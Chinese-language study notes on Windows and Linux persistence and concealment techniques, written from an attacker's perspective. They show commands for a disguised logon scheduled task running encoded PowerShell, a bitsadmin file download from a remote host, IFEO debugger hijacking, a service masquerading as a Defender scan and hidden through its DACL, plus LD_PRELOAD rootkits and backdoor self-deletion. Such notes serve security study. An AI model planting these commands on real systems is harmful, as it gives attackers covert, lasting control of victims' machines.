通过删除注册表中对应任务计划的SD记录实现隐藏（前提是具有管理员权限）。可实现隐藏计划任务。

>创建计划任务
```powershell
//创建一个任务计划，当用户登录时执行PowerShell命令，并延时3分钟执行
schtasks /Create /TN \Microsoft\Windows\Cortana /TR "powershell -Nop -enc KABOAxxx=" /SC ONLOGON /DELAY 0003:00 /F 

/TN  任务名，/TR 任务运行路径，/SC 计划频率，ONLOGON用户登录时
/DELAY 参数的时间格式为 mmmm:ss（分钟:秒）
/F：强制创建任务。如果指定的任务已经存在，直接覆盖且不发出警告。
-enc ：接受一段经过 Base64 编码的字符串，解码后直接在内存中执行其中的 PowerShell 命令。
-Nop：在启动 PowerShell 时，强制跳过加载当前用户的配置文件，直接进入一个“纯净”的原始环境
```

## bitsadmin
后台智能传输服务（BITS），可以提升将文件传输到Web服务器（HTTP）和共享文件夹（SMB）的能力。
微软提供了一个名为“bitsadmin”的二进制文件和PowerShell命令行环境，用于创建和管理文件传输任务。（win7以上自带）
```powershell
bitsadmin.exe /transfer calc /download  /priority high
"http://192.168.1.1/calc.exe" C:\calc.exe

/transfer calc：表示创建一个名为 calc 的传输任务。
/download：指定该任务的操作类型为“下载”。
/priority high：设置这个下载任务的优先级为“高（High）”。BITS 默认的优先级是 Normal（正常），它会为了不抢占网络资源而刻意限速；设置为 High 或 Foreground 可以显著提升下载速度。
```
## 映像劫持
映像劫持（Image File Execution Options，IFEO）也叫作重定向劫持，是指为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。
其初衷是在程序启动时开启调试器来调试程序。
攻击者在任意程序加载之前加载恶意程序，达到持久控制的目的。
```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe" /v "Debugger" /t REG_SZ /d "c:\windows\system32\cmd.exe" /f
```
## PowerShell Profile

## 隐藏服务
Windows服务支持使用安全描述符定义语言（Service Descriptor Definition Language，SDDL)来控制服务的权限
Windows系统管理员通常不会手动修改这些权限，但攻击者可以通过修改服务的自由访问控制列表（DACL）使恶意服务“隐身”。
> 创建服务
```powershell
sc.exe create MpCmdScan binPath="rundll32.exe C:\Windows\MpCmdRun.dll,VirusScan" start= auto type= share
```
>修改DACL
```powershell
sc.exe sdset MpCmdScan "D:(D:;DCLCWPDTSD;;;ID"
```

### Rootkit
rootkit分为用户态和内核态两种。
>用户态

rootkit可以使用LD_PRELOAD实现。
LD_PRELOAD是一个环境变量，用于在程序运行时动态加载共享库。当程序运行时，链接器会先搜索由LD_PRELOAD指定的共享库。如果找到共享库，就会优先加载该共享库中的函数，而不是系统函数库中的同名函数
利用这个机制，攻击者可以修改系统程序的行为，隐藏进程、文件或者网络连接。
>内核态

## 自删除
攻击者设置的后门在执行后一般会进行自删除。
这里的自删除并不是指将“自己”彻底删除，而是复制一个后门并将其放到系统目录下，复制的后门执行后，原后门删除“自己”，造成一种被删除的假象。
复制文件，使用CopyFile()函数
运行程序，使用WinExecO函数
创建一个批处理任务，删除“自己”del c:\backdoor.exe
